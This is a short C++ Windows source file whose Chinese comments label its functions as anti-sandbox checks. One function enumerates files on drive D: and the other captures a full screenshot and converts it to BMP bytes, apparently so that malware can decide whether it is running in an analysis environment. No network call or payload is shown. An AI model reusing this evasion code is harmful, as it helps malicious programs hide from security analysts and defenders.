#include <iostream>
#include <windows.h>

using namespace std;

// 抗沙箱: 获取 D 盘文件目录
char* GetDList(int* pDetermineDataLength) {
    char* determineData = (char*)malloc(1000);
    *determineData = '\0';

    char drive[] = { 'D',':','\\','*','\0' };
    WIN32_FIND_DATAA findData;
    HANDLE hFile = FindFirstFileA(drive, &findData);
    if (hFile != INVALID_HANDLE_VALUE) {
        do {
            sprintf_s(determineData, 1000, "%s,%s", determineData, findData.cFileName);
        } while (FindNextFileA(hFile, &findData));
        FindClose(hFile);
    }
    *pDetermineDataLength = strlen(determineData);
    return determineData;
}

char* GetBitmapBin(HBITMAP hBitmap, int* pBitMapBinSize);

// 抗沙箱: 截屏
char* GetScreenshot(int* pDetermineDataLength) {
	// 获取屏幕的设备上下文
	SetProcessDPIAware();
	HDC hScreenDC = GetDC(NULL);

	// 创建位图与上下文关联
	int screenWidth = GetDeviceCaps(hScreenDC, HORZRES);
	int screenHeight = GetDeviceCaps(hScreenDC, VERTRES);
	HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, screenWidth, screenHeight);
	HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
	SelectObject(hMemoryDC, hBitmap);

	// 屏幕内容拷贝到位图
	BitBlt(hMemoryDC, 0, 0, screenWidth, screenHeight, hScreenDC, 0, 0, SRCCOPY);

	// 获取位图二进制数据
	char* bitMapBin = GetBitmapBin(hBitmap, pDetermineDataLength);

	DeleteObject(hBitmap);
	DeleteDC(hMemoryDC);
	ReleaseDC(NULL, hScreenDC);
	return bitMapBin;
}

// 获取位图二进制数据
char* GetBitmapBin(HBITMAP hBitmap, int* pBitMapBinSize) {
	BITMAP bmp;
	GetObject(hBitmap, sizeof(BITMAP), &bmp);

	BITMAPINFOHEADER bi;
	bi.biSize = sizeof(BITMAPINFOHEADER);
	bi.biWidth = bmp.bmWidth;
	bi.biHeight = -bmp.bmHeight;
	bi.biPlanes = 1;
	bi.biBitCount = 32;
	bi.biCompression = BI_RGB;
	bi.biSizeImage = 0;
	bi.biXPelsPerMeter = 0;
	bi.biYPelsPerMeter = 0;
	bi.biClrUsed = 0;
	bi.biClrImportant = 0;
	DWORD dwBmpSize = ((bmp.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmp.bmHeight;

	BITMAPFILEHEADER bmfHeader;
	bmfHeader.bfType = 0x4D42;
	bmfHeader.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwBmpSize;
	bmfHeader.bfReserved1 = 0;
	bmfHeader.bfReserved2 = 0;
	bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

	*pBitMapBinSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwBmpSize;
	char* bitMapBin = (char*)malloc(*pBitMapBinSize);
	memcpy(bitMapBin, &bmfHeader, sizeof(BITMAPFILEHEADER));
	memcpy(bitMapBin + sizeof(BITMAPFILEHEADER), &bi, sizeof(BITMAPINFOHEADER));
	GetBitmapBits(hBitmap, dwBmpSize, bitMapBin + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER));
	return bitMapBin;
}